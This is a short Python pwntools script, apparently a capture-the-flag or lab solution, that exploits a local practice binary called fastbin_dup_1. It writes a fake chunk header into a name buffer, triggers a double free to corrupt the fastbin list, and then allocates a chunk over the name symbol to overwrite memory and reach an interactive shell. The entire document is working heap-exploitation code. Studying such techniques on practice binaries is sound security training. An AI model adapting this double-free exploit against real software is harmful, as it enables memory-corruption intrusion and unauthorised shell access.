from pwn import *

p = process("./fastbin_dup_1")
e = ELF("./fastbin_dup_1")

def alloc(data):
    p.sendlineafter(">", "1")
    p.sendlineafter(":", str(data))

def free(idx):
    p.sendlineafter(">", "2")
    p.sendlineafter(":",str(idx))

def get_shell():
    p.recvuntil("> ")
    p.sendline("3")
    p.interactive()
    

pay = b""
pay += p64(0)
pay += p64(0x31)

p.sendafter("Name : ", pay)

alloc("AAAA")
alloc("BBBB")

# input("1")

free(0)
free(1)
free(0)

# input("2")

alloc(p64(e.symbols['name']))


# input("x")

alloc("CCCC")
alloc("DDDD")

# input("3")


alloc(p64(0xDEADBEEF))

# input("4")

get_shell()


input()

p.interactive()